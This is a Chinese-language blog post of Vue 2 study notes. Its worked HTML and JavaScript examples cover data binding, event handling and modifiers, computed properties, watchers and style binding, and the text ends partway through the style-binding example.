---
title: Vue
urlname: ssspq6niuod6egm8
date: '2022-11-13 19:23:09 +0800'
tags:
  - Vue
categories:
  - Vue
---

## Vue 的安装

在 vue 的官网中下载 vue.js

![](https://cdn.xiamu.icu//FhuE6W_YvUVHibqT1C_ygV8-_3V-.png)
vue.js 一般使用在开发环境中, vue.min.js 一般使用在生产环境中

然后创建一个.html 文件, 在页面上运行

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>初始Vue</title>
    <script src="../js/vue.js"></script>
  </head>
  <body></body>
</html>
```

在页面上打开 F12, 发现有两条提示
![](https://cdn.xiamu.icu//FsB3iPVSUh479sTmNgwbLxcwmsWu.png)
第一个提示, 需要我们下载一个 Vue 的拓展来开发
[https://devtools.vuejs.org/guide/installation.html](https://devtools.vuejs.org/guide/installation.html)下载地址
![](https://cdn.xiamu.icu//FozDFSHXvOICedenvKUr84W9qpCm.png)
下载完成之后会在右上角显示
![](https://cdn.xiamu.icu//FnstYDzNp9eHg5jRjk1hz8wbTsIj.png)
第二个提示, 则是我们需要在生产环境中使用 vue.min.js
这代码编写的过程中, 我们可以关闭这个提示
![](https://cdn.xiamu.icu//FkAoPi0wKkId4x0vdOf3RTIguozX.png)
Vue.config.productionTip=false

```html
<script src="../js/vue.js"></script>
<script>
  Vue.config.productionTip = false;
</script>
```

再回过头看控制台, 警告就消失了
![](https://cdn.xiamu.icu//Fs8wwre-faG7khW8kPe0l3IaojR6.png)

## 初识 Vue

容器跟组件只能一对一

```
{{}}
```

叫插值语法, 插值表达式

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>初始Vue</title>
    <script src="../js/vue.js"></script>
  </head>

  <!-- 
			初识Vue：
				1.想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象；
				2.root容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法；
				3.root容器里的代码被称为【Vue模板】；
				4.Vue实例和容器是一一对应的；
				5.真实开发中只有一个Vue实例，并且会配合着组件一起使用；
				6.{{xxx}}中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性；
				7.一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新；

				注意区分：js表达式 和 js代码(语句)
						1.表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方：
									(1). a
									(2). a+b
									(3). demo(1)
									(4). x === y ? 'a' : 'b'

						2.js代码(语句)
									(1). if(){}
									(2). for(){}
	-->

  <body>
    <div id="root">
      <h1>Hello, {{name}}, {{address}}</h1>
    </div>
    <script>
      Vue.config.productionTip = false; // 阻止 vue 在启动时生成生产提示
      // 创建Vue实例
      const x = new Vue({
        el: "#root", // el用于指定当前实例为哪个容器服务, 值通过为css选择器字符串
        data: {
          // data中用于存储数据, 数据el所指定的容器去试用, 值我们暂时写写成一个对象
          name: "尚硅谷",
          address: "北京",
        },
      });
    </script>
  </body>
</html>
```

v-bind 可以简写 :

## 模板语法

```html
<!-- 
				Vue模板语法有2大类：
					1.插值语法：
							功能：用于解析标签体内容。
							写法：{{xxx}}，xxx是js表达式，且可以直接读取到data中的所有属性。
					2.指令语法：
							功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）。
							举例：v-bind:href="xxx" 或  简写为 :href="xxx"，xxx同样要写js表达式，
									 且可以直接读取到data中的所有属性。
							备注：Vue中有很多的指令，且形式都是：v-????，此处我们只是拿v-bind举个例子。
		 -->

<div id="root">
  <a v-bind:href="school.url" x="hello">去尚硅谷</a>
  <a :href="school.url.toUpperCase()" x="hello">去尚硅谷</a>
</div>
<script>
  new Vue({
    el: "#root",
    data: {
      name: "jack",
      school: {
        name: "尚硅谷",
        url: "http://www.atguigu.com",
      },
    },
  });
</script>
```

## 数据绑定

```html
<!-- 
            Vue中有2种数据绑定的方式：
                    1.单向绑定(v-bind)：数据只能从data流向页面。
                    2.双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data。
                        备注：
                                1.双向绑定一般都应用在表单类元素上（如：input、select等）
                                2.v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值。
         -->
<div id="root">
  <!-- 单向数据绑定: <input type="text" v-bind:value="name"><br>
        双向数据绑定: <input type="text" v-model:value="name"> -->

  单向数据绑定: <input type="text" :value="name" /><br />
  双向数据绑定: <input type="text" v-model="name" />

  <!-- 如下代码是错误的, 因为v-model只能应用在表单类(输入类元素上) -->
  <!-- <h2 v-model:x="name">你好啊</h2> -->
</div>
<script>
  new Vue({
    el: "#root",
    data: {
      name: "尚硅谷",
    },
  });
</script>
```

![](https://cdn.xiamu.icu//FkN-VKccqn98LfjSOAGho-PKzueW.png)

## el 与 data 的两种写法

```html
<!-- 
			data与el的2种写法
					1.el有2种写法
									(1).new Vue时候配置el属性。
									(2).先创建Vue实例，随后再通过vm.$mount('#root')指定el的值。
					2.data有2种写法
									(1).对象式
									(2).函数式
									如何选择：目前哪种写法都可以，以后学习到组件时，data必须使用函数式，否则会报错。
					3.一个重要的原则：
									由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了。
		-->
<div id="root">
  <h1>你好, {{name}}</h1>
</div>
<script>
  // el的两种写法
  const v = new Vue({
    // el: '#root', // 第一种写法
    data: {
      name: "尚硅谷",
    },
  });
  console.log(v);
  v.$mount("#root"); // 第二种写法
</script>
```

```html
<script>
  // data的两种写法
  //data的第一种写法: 对象式
  /*         new Vue({
                    el: '#root',
                    data: {
                        name: '尚硅谷'
                    },
                }) */

  //data的第二种写法: 函数式
  new Vue({
    el: "#root",
    data: function () {
      return {
        name: "尚硅谷",
      };
    },
  });
</script>
```

## 理解 MVVM

### 编写代码片段

![](https://cdn.xiamu.icu//Fmrh-jif1Oct4SsBaXevvqdboLM3.png)
![](https://cdn.xiamu.icu//ForNNCn9gFKlgtoGVxt3OwjVoIug.png)
复制如下代码保存

```json
{
  "Print to console": {
    "scope": "html, javascript, typescript",
    "prefix": "v1",
    "body": [
      "new Vue({",
      "    el: '#root',",
      "    data: {",
      "        $1",
      "    }",
      "})"
    ],
    "description": "生成一个Vue实例"
  }
}
```

在页面中只需要输入 v1, 就可以快速创建一个 Vue 实例, 非常的方便
![](https://cdn.xiamu.icu//Fk8T9TE0eA0hyqhRubaMfzzGBRn_.png)
![](https://cdn.xiamu.icu//FkpARlNJIeoPEhcehZgyx2CVOSV9.png)

### MVVM 模型

1. M：模型(Model) ：对应 data 中的数据
2. V：视图(View) ：模板
3. VM：视图模型(ViewModel) ： Vue 实例对象

![](https://cdn.xiamu.icu//FrH780-IlvcSQ07Szb4VrEeiYJeL.png)
MVVM 模型就是把一些乱七八糟的数据和一堆乱七八糟的 DOM 结构在中间使用 VM 连接
![](https://cdn.xiamu.icu//Fh0F7zDEzwnYD3ecu6o2jpOAWRhA.png)

```html
<!-- 
            MVVM模型
                        1. M：模型(Model) ：data中的数据
                        2. V：视图(View) ：模板代码
                        3. VM：视图模型(ViewModel)：Vue实例
            观察发现：
                        1.data中所有的属性，最后都出现在了vm身上。
                        2.vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用。
        -->
```

## 回顾 Object.defineProperty 方法

### enumerable

此时这种写法是可以遍历 person 的属性的
![](https://cdn.xiamu.icu//FtX0tgWd8uzb9cUW8J4MfgavMiya.png)
![](https://cdn.xiamu.icu//FrXA8Fuq8qGMBTPkqInoZSFTIAsa.png)
![](https://cdn.xiamu.icu//FgKVbzn25iQnN7Xh35OZsb9i9BGN.png)
从上可以观察到 Object.defineProperty 定义的属性, 默认是不能被遍历的
只有设置了 enumerable: true 才能被遍历

### writable

![](https://cdn.xiamu.icu//FjjGZnZ3OGWCli-wJmX6Vk3gzWaK.png)
![](https://cdn.xiamu.icu//Fm4rhC52nQ_CkFeshhKPbIiw7OV2.png)
![](https://cdn.xiamu.icu//Fo_cGboLeidmD7mUWL3s-Fhim2gQ.png)
从上面可以观察到 Object.defineProperty 定义的属性, 默认是不能修改的
只有设置了  writable: true, 才能被修改

![](https://cdn.xiamu.icu//FidL1vdJvYpkmBCyGrQT82nUA3LN.png)
![](https://cdn.xiamu.icu//FqmfosKwNZauwOzbEAT28FsI4FSE.png)
![](https://cdn.xiamu.icu//FoscBO3dZI55tcMQt5rJ9RdPfnU5.png)
从上面可以观察到 Object.defineProperty 定义的属性, 默认是不能删除的
只有设置了  configurable: true 才能被删除

## 数据代理

```html
<!-- 
				1.Vue中的数据代理：
							通过vm对象来代理data对象中属性的操作（读/写）
				2.Vue中数据代理的好处：
							更加方便的操作data中的数据
				3.基本原理：
							通过Object.defineProperty()把data对象中所有属性添加到vm上。
							为每一个添加到vm上的属性，都指定一个getter/setter。
							在getter/setter内部去操作（读/写）data中对应的属性。
	-->

<!-- 数据代理: 通过一个对象代理对另一个对象中属性的操作 (读/写) -->
<script>
  let obj = { x: 100 };
  let obj2 = { y: 200 };
  Object.defineProperty(obj2, "x", {
    get() {
      return obj.x;
    },
    set(value) {
      obj.x = value;
    },
  });
</script>
```

![](https://cdn.xiamu.icu//FlGlmxKnTsYowLjHqx2x6w8Tg5Pg.png)
修改了 obj2.x 的值, obj.x 值也随之发生了变化

![](https://cdn.xiamu.icu//FpGm4QqLJHKKg6ZK1Qr0I1HiZWgf.png)

vm 中使用了 Object.defineProperty 代理了\_data 的属性
\_data.name 中有 data 的值
![](https://cdn.xiamu.icu//FuSX3UYZcaTceN6qhdgso5BwKnp5.png)

## 事件处理

事件的基本使用

```html
<!-- 
                事件的基本使用：
                            1.使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名；
                            2.事件的回调需要配置在methods对象中，最终会在vm上；
                            3.methods中配置的函数，不要用箭头函数！否则this就不是vm了；
                            4.methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象；
                            5.@click="demo" 和 @click="demo($event)" 效果一致，但后者可以传参；
    -->
<div id="root">
  <h2>欢迎来到{{name}}学习</h2>
  <button v-on:click="showInfo1">点我提示信息</button>
  <button @click="showInfo2(66, $event)">点我提示信息</button>
</div>
<script>
  const vm = new Vue({
    el: "#root",
    data: {
      name: "尚硅谷",
    },
    methods: {
      showInfo1(event) {
        console.log(event.target.innerText);
        console.log(this); // 此处的this是vm对象
        // alert('同学您好!');
      },
      showInfo2(number, a) {
        console.log(a);
        // console.log(event.target.innerText);
        // console.log(this); // 此处的this是vm对象
        console.log(number);
        alert("同学您好!!");
      },
    },
  });
</script>
```

事件修饰符

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>事件修饰符</title>
       
    <script src="../js/vue.js"></script>
       
    <style>
              * {
                  margin-top: 20px;
              }


              .demo1 {
                  height: 50px;
                  background-color: skyblue;
              }


              .box1 {
                  padding: 5px;
                  background-color: skyblue;
              }


              .box2 {
                  padding: 5px;
                  background-color: orange;
              }


              .list {
                  width: 200px;
                  height: 200px;
                  background-color: peru;
                  overflow: auto;
              }


              li {
                  height: 100px;
              }
         
    </style>
  </head>

  <body>
       
    <!-- 
                Vue中的事件修饰符：
                        1.prevent：阻止默认事件（常用）；
                        2.stop：阻止事件冒泡（常用）；
                        3.once：事件只触发一次（常用）；
                        4.capture：使用事件的捕获模式；
                        5.self：只有event.target是当前操作的元素时才触发事件；
                        6.passive：事件的默认行为立即执行，无需等待事件回调执行完毕；
        -->
       
    <div id="root">
             
      <!-- 阻止默认事件（常用）； -->
             
      <h2>欢迎来到{{name}}学习</h2>
             
      <a href="http://www.atguigu.com" @click.prevent="showInfo"
        >点我提示信息</a
      >

             
      <!-- 阻止事件冒泡（常用）； -->
             
      <div class="demo1" @click="showInfo">
                    <button @click.stop="showInfo">点我提示信息</button>        
           
        <!-- 修饰符可以连续写 -->
                   
        <a href="http://www.atguigu.com" @click.prevent.stop="showInfo"
          >点我提示信息</a
        >
               
      </div>

             
      <!-- 触发过一次之后就不会再触发了 -->
             
      <!-- 事件只触发一次（常用）； -->
              <button @click.once="showInfo">点我提示信息</button>

             
      <!-- 使用事件的捕获模式； -->
             
      <div class="box1" @click.capture="showMsg(1)">
                    div1            
        <div class="box2" @click="showMsg(2)">
                          div2            
        </div>
               
      </div>

             
      <!-- 只有event.target是当前操作的元素时才触发事件； -->
             
      <div class="demo1" @click.self="showInfo">
                    <button @click="showInfo">点我提示信息</button>        
      </div>

             
      <!-- 事件的默认行为立即执行，无需等待事件回调执行完毕； -->
             
      <ul @wheel.passive="demo" class="list">
                   
        <li>1</li>
                   
        <li>2</li>
                   
        <li>3</li>
                   
        <li>4</li>
               
      </ul>
             
      <!-- scroll用这个事件之后就可以不用添加passive修饰符 -->
             
      <!-- wheel事件会在函数调用完之后, 滚动条才会发生变化 -->
             
      <!-- 给wheel加上passive之后, 即使函数还没执行完, 滚动条依旧会滚动 -->
             
      <ul @scroll="demo" class="list">
                   
        <li>1</li>
                   
        <li>2</li>
                   
        <li>3</li>
                   
        <li>4</li>
               
      </ul>

         
    </div>
       
    <script>
      new Vue({
        el: "#root",
        data: {
          name: "尚硅谷",
        },
        methods: {
          showInfo(event) {
            // event.preventDefault();
            alert("同学你好! ");
          },
          showMsg(msg) {
            console.log(msg);
          },
          demo() {
            for (let i = 0; i < 100000; i++) {
              console.log("#");
            }
          },
        },
      });
    </script>
  </body>
</html>
```

## 键盘事件

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>键盘事件</title>
    <script src="../js/vue.js"></script>
</head>

<body>
    <!--
				1.Vue中常用的按键别名：
							回车 => enter
							删除 => delete (捕获“删除”和“退格”键)
							退出 => esc
							空格 => space
							换行 => tab (特殊，必须配合keydown去使用)
							上 => up
							下 => down
							左 => left
							右 => right

				2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）

				3.系统修饰键（用法特殊）：ctrl、alt、shift、meta
							(1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
							(2).配合keydown使用：正常触发事件。

				4.也可以使用keyCode去指定具体的按键（不推荐）

				5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名
	-->
    <div id="root">
        <h2>欢迎来到{{name}}学习</h2>
        <!-- <input type="text" placeholder="按下回车提示输入" @keyup.caps-lock="showInfo"> -->
        <!-- <input type="text" placeholder="按下回车提示输入" @keydown.tab="showInfo"> -->
        <!-- <input type="text" placeholder="按下回车提示输入" @keydown.ctrl="showInfo"> -->
        <!-- <input type="text" placeholder="按下回车提示输入" @keydown.huiche="showInfo"> -->

        <!-- 只允许按下CtrlY的时候触发事件 -->
        <input type="text" placeholder="按下回车提示输入" @keydown.ctrl.y="showInfo">
    </div>
    <script>
        Vue.config.productionTip = false // 阻止 vue 在启动时生成生产提示
        Vue.config.keyCodes.huiche = 13  // 定义了一个别名按键
        new Vue({
            el: '#root',
            data: {
                name: '尚硅谷'
            },
            methods: {
                showInfo(e) {
                    console.log(e.key, e.keyCode);
                    // console.log(e.target.value);
                }
            }
        })
    </script>

</html>
```

## 计算属性

姓名案例\_插值语法实现

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>姓名案例_插值语法实现</title>
       
    <script src="../js/vue.js"></script>
  </head>
  <body>
       
    <div id="root">
              姓: <input type="text" v-model="firstName" /> <br /><br />
              名: <input type="text" v-model="lastName" /> <br /><br />
              全名: <span>{{firstName}}-{{lastName}}</span>         全名:
      <span>{{firstName.slice(0, 3)}}-{{lastName}}</span>    
    </div>
       
    <script>
      Vue.config.productionTip = false; // 阻止 vue 在启动时生成生产提示
      new Vue({
        el: "#root",
        data: {
          firstName: "张",
          lastName: "三",
        },
        methods: {},
      });
    </script>
  </body>
</html>
```

姓名案例\_methods 实现

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>姓名案例_methods实现</title>
       
    <script src="../js/vue.js"></script>
  </head>
  <body>
       
    <div id="root">
              姓: <input type="text" v-model="firstName" /> <br /><br />
              名: <input type="text" v-model="lastName" /> <br /><br />
              全名: <span>{{fullName()}}</span>        
      <!-- 插值语法调用方法需要加() -->
             
      <!-- 绑定事件的方法可加括号, 也可不加括号 -->
         
    </div>
       
    <script>
      Vue.config.productionTip = false; // 阻止 vue 在启动时生成生产提示
      new Vue({
        el: "#root",
        data: {
          firstName: "张",
          lastName: "三",
        },
        methods: {
          fullName() {
            // alert(1)
            return this.firstName + "-" + this.lastName;
          },
        },
      });
    </script>
  </body>
</html>
```

姓名案例\_计算属性

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>姓名案例_计算属性</title>
       
    <script src="../js/vue.js"></script>
  </head>

  <body>
       
    <!-- 
            计算属性：
                    1.定义：要用的属性不存在，要通过已有属性计算得来。
                    2.原理：底层借助了Objcet.defineproperty方法提供的getter和setter。
                    3.get函数什么时候执行？
                                (1).初次读取时会执行一次。
                                (2).当依赖的数据发生改变时会被再次调用。
                    4.优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
                    5.备注：
                            1.计算属性最终会出现在vm上，直接读取使用即可。
                            2.如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。
    -->
       
    <div id="root">
              姓: <input type="text" v-model="firstName" /> <br /><br />
              名: <input type="text" v-model="lastName" /> <br /><br />
              全名: <span>{{fullName}}</span> <br /><br />
              全名: <span>{{fullName}}</span> <br /><br />
              全名: <span>{{fullName}}</span> <br /><br />
              全名: <span>{{fullName}}</span>        
      <!-- fullName里面的get函数只会被调用一次, 因为这里面有缓存机制 -->
             
      <!-- 如果在methods中定义的函数中存在get函数, 且调用的是methods里面函数的get, 会被调用多次 -->
         
    </div>
       
    <script>
      Vue.config.productionTip = false; // 阻止 vue 在启动时生成生产提示
      const vm = new Vue({
        el: "#root",
        data: {
          firstName: "张",
          lastName: "三",
        },
        methods: {},
        computed: {
          // 计算属性, 以后计算出来的属性, 不在_data
          fullName: {
            // get 有什么作用? 当有人读取fullName时, get就会被调用, 且返回值就作为fullName的值
            // get 什么时候被调用?
            // 1. 初次读取fullName时
            // 2. 所依赖的数据发生变化时
            get() {
              console.log("get被调用了"); // console.log(this); // 此处的this是vm
              return this.firstName + "-" + this.lastName;
            }, // set什么时候被调用? // 当fullName被修改时
            set(value) {
              console.log("set", value);
              const arr = value.split("-");
              console.log(arr[0]);
              console.log(arr[1]);
              this.firstName = arr[0];
              this.lastName = arr[1];
            },
          },
        },
      });
    </script>
  </body>
</html>
```

姓名案例\_计算属性简写

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>姓名案例_计算属性简写</title>
       
    <script src="../js/vue.js"></script>
  </head>

  <body>
       
    <div id="root">
              姓: <input type="text" v-model="firstName" /> <br /><br />
              名: <input type="text" v-model="lastName" /> <br /><br />
              全名: <span>{{fullName}}</span> <br /><br />
         
    </div>
       
    <script>
      Vue.config.productionTip = false; // 阻止 vue 在启动时生成生产提示
      const vm = new Vue({
        el: "#root",
        data: {
          firstName: "张",
          lastName: "三",
        },
        methods: {},
        computed: {
          // 完整写法
          /*                 fullName: {
                                    get() {
                                        console.log('get被调用了');
                                        return this.firstName + '-' + this.lastName
                                    },
                                    set(value) {
                                        console.log('set', value);
                                        const arr = value.split('-');
                                        console.log(arr[0]);
                                        console.log(arr[1]);
                                        this.firstName = arr[0];
                                        this.lastName = arr[1];
                                    }
                                } */
          // 简写写法
          // 只考虑读取, 不考虑修改的时候才能使用简写的方式
          fullName() {
            console.log("get被调用了");
            return this.firstName + "-" + this.lastName;
          },
        },
      });
    </script>
  </body>
</html>
```

## 监视属性

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>天气案例</title>
       
    <script src="../js/vue.js"></script>
  </head>
  <body>
       
    <div id="root">
             
      <h2>今天天气很{{info}}</h2>
             
      <!-- 绑定事件的时候: @xxx="yyy" yyy可以写一些简单的语句 -->
              <button @click="isHot = !isHot">切换天气</button>        
      <!-- <button @click="changeWeather">切换天气</button> -->
         
    </div>
       
    <script>
      Vue.config.productionTip = false;

      new Vue({
        el: "#root",
        data: {
          isHot: true,
        },
        methods: {
          changeWeather() {
            this.isHot = !this.isHot;
          },
        },
        computed: {
          info() {
            return this.isHot ? "炎热" : "凉爽";
          },
        },
      });
    </script>
  </body>
</html>
```

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>天气案例_监视属性</title>
       
    <script src="../js/vue.js"></script>
  </head>

  <body>
       
    <!-- 
                监视属性watch：
                    1.当被监视的属性变化时, 回调函数自动调用, 进行相关操作
                    2.监视的属性必须存在，才能进行监视！！
                    3.监视的两种写法：
                            (1).new Vue时传入watch配置
                            (2).通过vm.$watch监视
    -->
       
    <div id="root">
             
      <h2>今天天气很{{info}}</h2>
             
      <!-- 绑定事件的时候: @xxx="yyy" yyy可以写一些简单的语句 -->
             
      <!-- <button @click="isHot = !isHot">切换天气</button> -->
              <button @click="changeWeather">切换天气</button>    
    </div>
       
    <script>
      Vue.config.productionTip = false;

      const vm = new Vue({
        el: "#root",
        data: {
          isHot: true,
        },
        methods: {
          changeWeather() {
            this.isHot = !this.isHot;
          },
        },
        computed: {
          info() {
            return this.isHot ? "炎热" : "凉爽";
          },
        } /*             watch: {
                            isHot: {
                                immediate:true, // 初始化时让handler调用一次
                                // handler 什么时候调用? isHot发生改变时
                                handler(newValue, oldValue) {
                                    console.log('isHot被修改了', newValue, oldValue);
                                }
                            }
                        } */,
      });

      vm.$watch("isHot", {
        immediate: true, // 初始化时让handler调用一次 // handler 什么时候调用? isHot发生改变时
        handler(newValue, oldValue) {
          console.log("isHot被修改了", newValue, oldValue);
        },
      });
    </script>
  </body>
</html>
```

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>天气案例_深度监视</title>
       
    <script src="../js/vue.js"></script>
  </head>

  <body>
       
    <!-- 
            深度监视：
                    (1).Vue中的watch默认不监测对象内部值的改变（一层）。
                    (2).配置deep:true可以监测对象内部值改变（多层）。
            备注：
                    (1).Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！
                    (2).使用watch时根据数据的具体结构，决定是否采用深度监视。
        -->
       
    <div id="root">
             
      <h2>今天天气很{{info}}</h2>
              <button @click="changeWeather">切换天气</button>        
      <hr />
             
      <h3>a的值是: {{numbers.a}}</h3>
              <button @click="numbers.a++">点我a++</button>        
      <h3>b的值是: {{numbers.b}}</h3>
              <button @click="numbers.b++">点我b++</button>

             
      <button @click="numbers = {a:666,b:999}">点我替换numbers</button>    
    </div>
       
    <script>
      Vue.config.productionTip = false;

      const vm = new Vue({
        el: "#root",
        data: {
          isHot: true,
          numbers: {
            a: 1,
            b: 1,
          },
        },
        methods: {
          changeWeather() {
            this.isHot = !this.isHot;
          },
        },
        computed: {
          info() {
            return this.isHot ? "炎热" : "凉爽";
          },
        },
        watch: {
          isHot: {
            // immediate: true, // 初始化时让handler调用一次
            // handler 什么时候调用? isHot发生改变时
            handler(newValue, oldValue) {
              console.log("isHot被修改了", newValue, oldValue);
            },
          }, // 监视多级结构中某个属性的变化 // 监视多级结构中所有属性的变化
          /*                 'numbers.a': {
                    handler(newValue, oldValue) {
                        console.log('numbers被修改了', newValue, oldValue);
                    }
                }, */
          numbers: {
            deep: true,
            handler() {
              console.log("numbers被修改了");
            },
          },
        },
      });
    </script>
  </body>
</html>
```

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>天气案例_监视属性_简写</title>
       
    <script src="../js/vue.js"></script>
  </head>

  <body>
       
    <div id="root">
             
      <h2>今天天气很{{info}}</h2>
              <button @click="changeWeather">切换天气</button>    
    </div>
       
    <script>
      Vue.config.productionTip = false;

      const vm = new Vue({
        el: "#root",
        data: {
          isHot: true,
        },
        methods: {
          changeWeather() {
            this.isHot = !this.isHot;
          },
        },
        computed: {
          info() {
            return this.isHot ? "炎热" : "凉爽";
          },
        },
        watch: {
          // 正常写法
          /*                 isHot: {
                                    // immediate: true, // 初始化时让handler调用一次
                                    // handler 什么时候调用? isHot发生改变时
                                    // deep: true,
                                    handler(newValue, oldValue) {
                                        console.log('isHot被修改了', newValue, oldValue);
                                    }
                                }, */
          // 简写
          // 没有deep, immediate的时候就可以简写
          // isHot(newValue, oldValue) {
          //     console.log('isHot被修改了', newValue, oldValue);
          // }
        },
      }); // 正常的写法 // vm.$watch('isHot', { //     // immediate: true, // 初始化时让handler调用一次 //     // handler 什么时候调用? isHot发生改变时 //     // deep: true, //     handler(newValue, oldValue) { //         console.log('isHot被修改了', newValue, oldValue); //     } // }) // 简写方式

      vm.$watch("isHot", function (newValue, oldValue) {
        console.log("isHot被修改了", newValue, oldValue);
      });
    </script>
  </body>
</html>
```

两个重要的小原则： 1.所被 Vue 管理的函数，最好写成普通函数，这样 this 的指向才是 vm 或 组件实例对象。 2.所有不被 Vue 所管理的函数（定时器的回调函数、ajax 的回调函数等、Promise 的回调函数），最好写成箭头函数，这样 this 的指向才是 vm 或 组件实例对象。

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>姓名案例_watch实现</title>
       
    <script src="../js/vue.js"></script>
  </head>

  <body>
       
    <!-- 
            computed和watch之间的区别：
                    1.computed能完成的功能，watch都可以完成。
                    2.watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。
            两个重要的小原则：
                        1.所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。
                        2.所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，
                            这样this的指向才是vm 或 组件实例对象。
    -->
       
    <div id="root">
              姓: <input type="text" v-model="firstName" /> <br /><br />
              名: <input type="text" v-model="lastName" /> <br /><br />
              全名: <span>{{fullName}}</span> <br /><br />
         
    </div>
       
    <script>
      Vue.config.productionTip = false; // 阻止 vue 在启动时生成生产提示
      const vm = new Vue({
        el: "#root",
        data: {
          firstName: "张",
          lastName: "三",
          fullName: "张-三",
        },
        methods: {},
        watch: {
          firstName(val) {
            setTimeout(() => {
              this.fullName = val + "-" + this.lastName;
            }, 1000);
          },
          lastName(val) {
            this.fullName = this.firstName + "-" + val;
          },
        },
      });
    </script>
  </body>
</html>
```

## 绑定样式

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>绑定样式</title>
       
    <style>
              .basic {
                  width: 400px;
                  height: 100px;
                  border: 1px solid black;
              }


              .happy {
                  border: 4px solid red;
                  ;
                  background-color: rgba(255, 255, 0, 0.644);
                  background: linear-gradient(30deg, yellow, pink, orange, yellow);
              }


              .sad {
                  border: 4px dashed rgb(2, 197, 2);
                  background-color: gray;
              }


              .normal {
                  background-color: skyblue;
              }


              .atguigu1 {
                  background-color: yellowgreen;
              }


              .atguigu2 {
                  font-size: 30px;
                  text-shadow: 2px 2px 10px red;
              }


              .atguigu3 {
                  border-radius: 20px;
              }
         
    </style>
       
    <script src="../js/vue.js"></script>
  </head>

  <body>
               
    <!-- 
            绑定样式：
                    1. class样式
                                写法:class="xxx" xxx可以是字符串、对象、数组。
                                        字符串写法适用于：类名不确定，要动态获取。
                                        对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。
                                        数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。
                    2. style样式
                                :style="{fontSize: xxx}"其中xxx是动态值。
                                :style="[a,b]"其中a、b是样式对象。
        -->
       
    <div id="root">
             
      <!-- 绑定class样式 -- 字符串写法, 适用于: 样式的类名不确定, 需要动态指定 -->
             
      <div class="basic" :class="mood" @click="changeMood">{{name}}</div>
      <br /><br />

             
      <!-- 绑定class样式 -- 数组写法, 适用于: 要绑定的样式个数不确定, 名字也不确定 -->
             
      <div class="basic" :class="classArr">{{name}}</div>
      <br /><br />

             
